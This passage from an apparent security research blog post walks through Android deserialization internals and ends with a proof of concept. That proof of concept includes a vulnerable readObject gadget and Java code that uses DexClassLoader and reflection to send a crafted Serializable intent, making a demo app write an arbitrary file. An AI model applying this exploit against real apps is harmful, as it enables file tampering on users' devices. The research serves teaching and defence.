+</span></span><span class=line><span class=cl>	    <span class=c1>// ..
+</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=k>try</span> <span class=o>{</span>
+</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=o>(</span><span class=n>obj</span> <span class=o>!=</span> <span class=kc>null</span><span class=o>)</span> <span class=o>{</span>
+</span></span><span class=line><span class=cl>                <span class=k>try</span> <span class=o>{</span>
+</span></span><span class=line><span class=cl>                    <span class=n>obj</span><span class=o>.</span><span class=na>readExternal</span><span class=o>(</span><span class=k>this</span><span class=o>);</span>
+</span></span><span class=line><span class=cl>                <span class=o>}</span> <span class=k>catch</span> <span class=o>(</span><span class=n>ClassNotFoundException</span> <span class=n>ex</span><span class=o>)</span> <span class=o>{</span>
+</span></span><span class=line><span class=cl>                    <span class=c1>// ..
+</span></span></span><span class=line><span class=cl><span class=c1></span>                <span class=o>}</span>
+</span></span><span class=line><span class=cl>            <span class=o>}</span>
+</span></span><span class=line><span class=cl>        <span class=o>}</span>
+</span></span><span class=line><span class=cl>    <span class=o>}</span>
+</span></span></code></pre></td></tr></table></div></div><p>Instead of calling <code>readObject</code> or <code>readObjectNoData</code>, the <code>readExternal</code> method is called directly from the <code>obj</code> itself. In this case, the <code>readExternal</code> implementation is mandatory and class-specific while the <code>Serializable</code> is just a mark interface.</p><a href=#readrecord><h4 id=readrecord><span class=hanchor arialabel=Anchor># </span><code>readRecord</code></h4></a><p>The <code>readRecord</code> method is instead responsible to parse record types. Since records are immutable and data-focused classes, they are not in our intereset and, for that reason, we are going to skip its parsing.</p><a href=#transient-and-not-serializable-classes><h3 id=transient-and-not-serializable-classes><span class=hanchor arialabel=Anchor># </span>Transient and not Serializable classes</h3></a><p>There are classes, typically related to system resources (socket, streams, threads, ..) or OS and runtime specific, that are not serializable and can be declared with the
+<a href=https://www.w3schools.com/java/ref_keyword_transient.asp rel=noopener><code>transient</code></a> keyword. The
+<a href=https://www.w3schools.com/java/ref_keyword_transient.asp rel=noopener><code>transient</code></a> prevents attributes from being deserialized and has been particularly used to prevent issues related to escalate java deserialization to C++ memory corruption primitives through unprotected <code>long</code> pointers (
+<a href=https://www.usenix.org/system/files/conference/woot15/woot15-paper-peles.pdf rel=noopener>One class to rule them all: 0-day deserialization vulnerabilities in Android</a> and
+<a href=https://securitylab.github.com/resources/android-deserialization-vulnerabilities/ rel=noopener>Android Deserialization Vulnerabilities: A Brief history</a>).
+If an attribute object that is not serializable (e.g. does not <code>implements</code> the <code>Serializable</code> mark interface), is not marked as <code>transient</code> and is part of a <code>Serializable</code> class, it will trigger a <code>java.io.NotSerializableException</code> inside <code>Parcel::writeObject0</code> only if the not serializable attribute is set from the sender side. Otherwise, the receving part will just receive <code>null</code>.</p><a href=#proof-of-concept><h2 id=proof-of-concept><span class=hanchor arialabel=Anchor># </span>Proof-Of-Concept</h2></a><a href=#scenario><h3 id=scenario><span class=hanchor arialabel=Anchor># </span>Scenario</h3></a><p>Let&rsquo;s build an application Proof Of Concept that takes a Serializable object through <code>getIntent().getSerializible()</code> and casts it to a really generic type (e.g. <code>Activity</code>). Also, the application contains the following vulnerable class that implements a <code>readObject</code> that permits to write an arbitrary file with arbitrary content. The class is <code>Serializable</code> and never used across the application (<em>You can also note the not serializable <code>ComponentName</code> attribute</em>):</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=kn>package</span> <span class=nn>com.example.serialized.receiver</span><span class=o>;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>android.content.ComponentName</span><span class=o>;</span>
+</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>android.util.Log</span><span class=o>;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>java.io.File</span><span class=o>;</span>
+</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>java.io.FileWriter</span><span class=o>;</span>
+</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>java.io.IOException</span><span class=o>;</span>
+</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>java.io.ObjectInputStream</span><span class=o>;</span>
+</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>java.io.Serializable</span><span class=o>;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=kd>public</span> <span class=kd>class</span> <span class=nc>CustomTargetClass</span> <span class=kd>implements</span> <span class=n>Serializable</span> <span class=o>{</span>
+</span></span><span class=line><span class=cl>    <span class=n>String</span> <span class=n>filename</span><span class=o>;</span>
+</span></span><span class=line><span class=cl>    <span class=n>String</span> <span class=n>content</span><span class=o>;</span>
+</span></span><span class=line><span class=cl>    <span class=n>ComponentName</span> <span class=n>cn</span><span class=o>;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=kd>static</span> <span class=o>{</span>
+</span></span><span class=line><span class=cl>        <span class=c1>// init
+</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=n>Log</span><span class=o>.</span><span class=na>d</span><span class=o>(</span><span class=s>&#34;SS&#34;</span><span class=o>,</span> <span class=s>&#34;CustomTargetClass::init&#34;</span><span class=o>);</span>
+</span></span><span class=line><span class=cl>    <span class=o>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=kd>private</span> <span class=kt>void</span> <span class=nf>readObject</span><span class=o>(</span><span class=n>ObjectInputStream</span> <span class=n>in</span><span class=o>)</span> <span class=kd>throws</span> <span class=n>IOException</span><span class=o>,</span> <span class=n>ClassNotFoundException</span> <span class=o>{</span>
+</span></span><span class=line><span class=cl>        <span class=n>in</span><span class=o>.</span><span class=na>defaultReadObject</span><span class=o>();</span>
+</span></span><span class=line><span class=cl>        
+</span></span><span class=line><span class=cl>        <span class=n>Log</span><span class=o>.</span><span class=na>d</span><span class=o>(</span><span class=s>&#34;SS&#34;</span><span class=o>,</span> <span class=s>&#34;CustomTargetClass::readObject&#34;</span><span class=o>);</span>
+</span></span><span class=line><span class=cl>        <span class=n>FileWriter</span> <span class=n>fileWriter</span><span class=o>;</span>
+</span></span><span class=line><span class=cl>        <span class=n>File</span> <span class=n>file</span> <span class=o>=</span> <span class=k>new</span> <span class=n>File</span><span class=o>(</span><span class=n>filename</span><span class=o>);</span>
+</span></span><span class=line><span class=cl>        <span class=n>fileWriter</span> <span class=o>=</span> <span class=k>new</span> <span class=n>FileWriter</span><span class=o>(</span><span class=n>file</span><span class=o>);</span>
+</span></span><span class=line><span class=cl>        <span class=n>fileWriter</span><span class=o>.</span><span class=na>write</span><span class=o>(</span><span class=n>content</span><span class=o>);</span>
+</span></span><span class=line><span class=cl>        <span class=n>fileWriter</span><span class=o>.</span><span class=na>close</span><span class=o>();</span>
+</span></span><span class=line><span class=cl>        <span class=n>Log</span><span class=o>.</span><span class=na>d</span><span class=o>(</span><span class=s>&#34;SS&#34;</span><span class=o>,</span> <span class=s>&#34;File written&#34;</span><span class=o>);</span>
+</span></span><span class=line><span class=cl>    <span class=o>}</span>
+</span></span><span class=line><span class=cl><span class=o>}</span>
+</span></span></code></pre></td></tr></table></div></div><p>The receiver exported activity contains the following code:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=kd>public</span> <span class=kd>class</span> <span class=nc>SerialReceiver</span> <span class=kd>extends</span> <span class=n>AppCompatActivity</span> <span class=o>{</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=nd>@Override</span>
+</span></span><span class=line><span class=cl>    <span class=kd>protected</span> <span class=kt>void</span> <span class=nf>onCreate</span><span class=o>(</span><span class=n>Bundle</span> <span class=n>savedInstanceState</span><span class=o>)</span> <span class=o>{</span>
+</span></span><span class=line><span class=cl>        <span class=kd>super</span><span class=o>.</span><span class=na>onCreate</span><span class=o>(</span><span class=n>savedInstanceState</span><span class=o>);</span>
+</span></span><span class=line><span class=cl>        <span class=n>setContentView</span><span class=o>(</span><span class=n>R</span><span class=o>.</span><span class=na>layout</span><span class=o>.</span><span class=na>activity_serial_receiver</span><span class=o>);</span>
+</span></span><span class=line><span class=cl>        <span class=n>Intent</span> <span class=n>in</span> <span class=o>=</span> <span class=n>getIntent</span><span class=o>();</span>
+</span></span><span class=line><span class=cl>        <span class=n>Activity</span> <span class=n>so</span> <span class=o>=</span> <span class=o>(</span><span class=n>Activity</span><span class=o>)</span> <span class=n>in</span><span class=o>.</span><span class=na>getSerializableExtra</span><span class=o>(</span><span class=s>&#34;so&#34;</span><span class=o>);</span>
+</span></span><span class=line><span class=cl>    <span class=o>}</span>
+</span></span><span class=line><span class=cl><span class=o>}</span>
+</span></span></code></pre></td></tr></table></div></div><a href=#exploitation><h3 id=exploitation><span class=hanchor arialabel=Anchor># </span>Exploitation</h3></a><p>Following what has been previously described in the &ldquo;Application specific gadgets&rdquo; chapter, we can extract the <code>classesN.dex</code> where our target object (<code>com.example.serialized.receiver.CustomTargetClass</code>) is defined and import it into our application. This task is easily feasible with a combination of <code>jadx-gui</code> and <code>apktool</code>. From <code>jadx-gui</code> we can see that the class <code>com.example.serialized.receiver.CustomTargetClass</code> is defined in <code>classes4.dex</code> (from the below comment &ldquo;loaded from&rdquo;):</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=kn>package</span> <span class=nn>com.example.serialized.receiver</span><span class=o>;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>android.content.ComponentName</span><span class=o>;</span>
+</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>android.util.Log</span><span class=o>;</span>
+</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>java.io.File</span><span class=o>;</span>
+</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>java.io.FileWriter</span><span class=o>;</span>
+</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>java.io.IOException</span><span class=o>;</span>
+</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>java.io.ObjectInputStream</span><span class=o>;</span>
+</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>java.io.Serializable</span><span class=o>;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=cm>/* loaded from: classes4.dex */</span>
+</span></span><span class=line><span class=cl><span class=kd>public</span> <span class=kd>class</span> <span class=nc>CustomTargetClass</span> <span class=kd>implements</span> <span class=n>Serializable</span> <span class=o>{</span>
+</span></span><span class=line><span class=cl>    <span class=cm>/* .. */</span>
+</span></span><span class=line><span class=cl><span class=o>}</span>
+</span></span></code></pre></td></tr></table></div></div><p>With <code>apktool --no-src d app.apk</code> we can than extract the <code>classes4.dex</code> file and import into our target application (inside <code>res/raw</code>).
+After that, we can dynamically load the class and set <code>filename</code> and <code>content</code> with arbitrary values:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span><span class=lnt>36
+</span><span class=lnt>37
+</span><span class=lnt>38
+</span><span class=lnt>39
+</span><span class=lnt>40
+</span><span class=lnt>41
+</span><span class=lnt>42
+</span><span class=lnt>43
+</span><span class=lnt>44
+</span><span class=lnt>45
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>Class</span><span class=o>&lt;?&gt;</span> <span class=n>loadedClass</span><span class=o>;</span>
+</span></span><span class=line><span class=cl><span class=n>Object</span> <span class=n>obj</span><span class=o>;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>File</span> <span class=n>dexFile</span> <span class=o>=</span> <span class=n>getFileFromRaw</span><span class=o>(</span><span class=n>R</span><span class=o>.</span><span class=na>raw</span><span class=o>.</span><span class=na>classes4_target</span><span class=o>,</span> <span class=s>&#34;classes_temp_out.dex&#34;</span><span class=o>);</span>
+</span></span><span class=line><span class=cl><span class=n>DexClassLoader</span> <span class=n>dexClassLoader</span> <span class=o>=</span> <span class=k>new</span> <span class=n>DexClassLoader</span><span class=o>(</span>
+</span></span><span class=line><span class=cl>        <span class=n>dexFile</span><span class=o>.</span><span class=na>getAbsolutePath</span><span class=o>(),</span>          <span class=c1>// Path to the DEX file
+</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=kc>null</span><span class=o>,</span>                               <span class=c1>// Deprecated since API 26
+</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=kc>null</span><span class=o>,</span>                               <span class=c1>// No native library search path
+</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=kc>null</span>  								<span class=c1>// Parent class loader
+</span></span></span><span class=line><span class=cl><span class=c1></span><span class=o>);</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>try</span> <span class=o>{</span>
+</span></span><span class=line><span class=cl>    <span class=n>loadedClass</span> <span class=o>=</span> <span class=n>dexClassLoader</span><span class=o>.</span><span class=na>loadClass</span><span class=o>(</span><span class=s>&#34;com.example.serialized.receiver.CustomTargetClass&#34;</span><span class=o>);</span>
+</span></span><span class=line><span class=cl><span class=o>}</span> <span class=k>catch</span> <span class=o>(</span><span class=n>ClassNotFoundException</span> <span class=n>e</span><span class=o>)</span> <span class=o>{</span>
+</span></span><span class=line><span class=cl>    <span class=k>throw</span> <span class=k>new</span> <span class=n>RuntimeException</span><span class=o>(</span><span class=n>e</span><span class=o>);</span>
+</span></span><span class=line><span class=cl><span class=o>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>try</span> <span class=o>{</span>
+</span></span><span class=line><span class=cl>    <span class=n>obj</span> <span class=o>=</span> <span class=n>loadedClass</span><span class=o>.</span><span class=na>newInstance</span><span class=o>();</span>
+</span></span><span class=line><span class=cl><span class=o>}</span> <span class=k>catch</span> <span class=o>(</span><span class=n>IllegalAccessException</span> <span class=o>|</span> <span class=n>InstantiationException</span> <span class=n>e</span><span class=o>)</span> <span class=o>{</span>
+</span></span><span class=line><span class=cl>    <span class=k>throw</span> <span class=k>new</span> <span class=n>RuntimeException</span><span class=o>(</span><span class=n>e</span><span class=o>);</span>
+</span></span><span class=line><span class=cl><span class=o>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1>// Setting filename and content
+</span></span></span><span class=line><span class=cl><span class=c1></span><span class=n>Field</span> <span class=n>f_att</span><span class=o>;</span>
+</span></span><span class=line><span class=cl><span class=k>try</span> <span class=o>{</span>
+</span></span><span class=line><span class=cl>    <span class=n>f_att</span> <span class=o>=</span> <span class=n>loadedClass</span><span class=o>.</span><span class=na>getDeclaredField</span><span class=o>(</span><span class=s>&#34;filename&#34;</span><span class=o>);</span>
+</span></span><span class=line><span class=cl>    <span class=n>f_att</span><span class=o>.</span><span class=na>setAccessible</span><span class=o>(</span><span class=kc>true</span><span class=o>);</span>
+</span></span><span class=line><span class=cl>    <span class=n>f_att</span><span class=o>.</span><span class=na>set</span><span class=o>(</span><span class=n>obj</span><span class=o>,</span> <span class=s>&#34;/data/data/com.example.serialized.receiver/pwn.txt&#34;</span><span class=o>);</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=n>f_att</span> <span class=o>=</span> <span class=n>loadedClass</span><span class=o>.</span><span class=na>getDeclaredField</span><span class=o>(</span><span class=s>&#34;content&#34;</span><span class=o>);</span>
+</span></span><span class=line><span class=cl>    <span class=n>f_att</span><span class=o>.</span><span class=na>setAccessible</span><span class=o>(</span><span class=kc>true</span><span class=o>);</span>
+</span></span><span class=line><span class=cl>    <span class=n>f_att</span><span class=o>.</span><span class=na>set</span><span class=o>(</span><span class=n>obj</span><span class=o>,</span> <span class=s>&#34;ARE YOU SERI-ALAZABLE?\n&#34;</span><span class=o>);</span>
+</span></span><span class=line><span class=cl><span class=o>}</span> <span class=k>catch</span> <span class=o>(</span><span class=n>NoSuchFieldException</span> <span class=o>|</span> <span class=n>IllegalAccessException</span> <span class=n>e</span><span class=o>)</span> <span class=o>{</span>
+</span></span><span class=line><span class=cl>    <span class=k>throw</span> <span class=k>new</span> <span class=n>RuntimeException</span><span class=o>(</span><span class=n>e</span><span class=o>);</span>
+</span></span><span class=line><span class=cl><span class=o>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1>// Sending intent
+</span></span></span><span class=line><span class=cl><span class=c1></span><span class=n>Intent</span> <span class=n>in</span> <span class=o>=</span> <span class=k>new</span> <span class=n>Intent</span><span class=o>();</span>
+</span></span><span class=line><span class=cl><span class=n>ComponentName</span> <span class=n>cn</span> <span class=o>=</span> <span class=k>new</span> <span class=n>ComponentName</span><span class=o>(</span><span class=s>&#34;com.example.serialized.receiver&#34;</span><span class=o>,</span> <span class=s>&#34;com.example.serialized.receiver.SerialReceiver&#34;</span><span class=o>);</span>
+</span></span><span class=line><span class=cl><span class=n>in</span><span class=o>.</span><span class=na>setComponent</span><span class=o>(</span><span class=n>cn</span><span class=o>);</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>in</span><span class=o>.</span><span class=na>putExtra</span><span class=o>(</span><span class=s>&#34;so&#34;</span><span class=o>,</span> <span class=o>(</span><span class=n>Serializable</span><span class=o>)</span> <span class=n>obj</span><span class=o>);</span>
+</span></span><span class=line><span class=cl><span class=n>startActivity</span><span class=o>(</span><span class=n>in</span><span class=o>);</span>
+</span></span></code></pre></td></tr></table></div></div><p>And the result is &mldr;</p><p><img src=/des-poc.png width=auto></p><a href=#conclusion><h2 id=conclusion><span class=hanchor arialabel=Anchor># </span>Conclusion</h2></a><p>In this blog post we deep dived into the deserialization mechanism of the critical and common <code>getSerializable</code> API showcasing its internals, from a source code point of view, and demonstrating its potential security impact.</p><a href=#references><h2 id=references><span class=hanchor arialabel=Anchor># </span>References</h2></a><ul><li><a href=https://developer.android.com rel=noopener>https://developer.android.com</a></li><li><a href="https://www.youtube.com/watch?v=qIzMKfOmIAA&t=1190s" rel=noopener>Android parcels: the bad, the good and the better</a></li><li><a href=https://github.com/michalbednarski/ReparcelBug2 rel=noopener>https://github.com/michalbednarski/ReparcelBug2</a></li><li><a href="https://github.com/michalbednarski/LeakValue?tab=readme-ov-file" rel=noopener>https://github.com/michalbednarski/LeakValue?tab=readme-ov-file</a></li><li><a href="https://www.youtube.com/watch?v=9Bw1urhk8zw" rel=noopener>RuhrSec 2016: &ldquo;Java deserialization vulnerabilities - The forgotten bug class&rdquo;, Matthias Kaiser</a></li><li><a href=https://docs.oracle.com/javase/8/docs/platform/serialization/spec/protocol.html rel=noopener>https://docs.oracle.com/javase/8/docs/platform/serialization/spec/protocol.html</a></li><li><a href=https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/ rel=noopener>What Do WebLogic, WebSphere, JBoss, Jenkins, OpenNMS, and Your Application Have in Common? This Vulnerability.</a></li><li><a href=https://www.usenix.org/system/files/conference/woot15/woot15-paper-peles.pdf rel=noopener>One class to rule them all: 0-day deserialization vulnerabilities in Android</a></li><li><a href=https://securitylab.github.com/resources/android-deserialization-vulnerabilities/ rel=noopener>Android Deserialization Vulnerabilities: A Brief history</a></li></ul></article><hr><div class=page-end id=footer><div class=backlinks-container><h3>Backlinks</h3><ul class=backlinks><li><a href=/ data-ctx="notes/Android Deserialization Deep Dive" data-src=/ class=internal-link>👾 KIKS.</a></li></ul></div><div><script src=https://cdn.jsdelivr.net/npm/d3@6.7.0/dist/d3.min.js integrity="sha256-+7jaYCp29O1JusNWHaYtgUn6EhuP0VaFuswhNV06MyI=" crossorigin=anonymous></script><h3>Interactive Graph</h3><div id=graph-container></div><style>:root{--g-node:var(--secondary);--g-node-active:var(--primary);--g-node-inactive:var(--visited);--g-link:var(--outlinegray);--g-link-active:#5a7282}</style><script src=https://1day.dev/js/graph.abd4bc2af3869a96524d7d23b76152c7.js></script></div></div><div id=contact_buttons><footer><p>Powered by <a href=https://github.com/jackyzha0/quartz>Quartz</a>, © 2025</p><ul><li><a href=https://1day.dev/>Home</a></li><li><a href=https://twitter.com/kiks7_7>Twitter</a></li><li><a href=https://github.com/kiks7>Github</a></li></ul></footer></div></div></body></html>
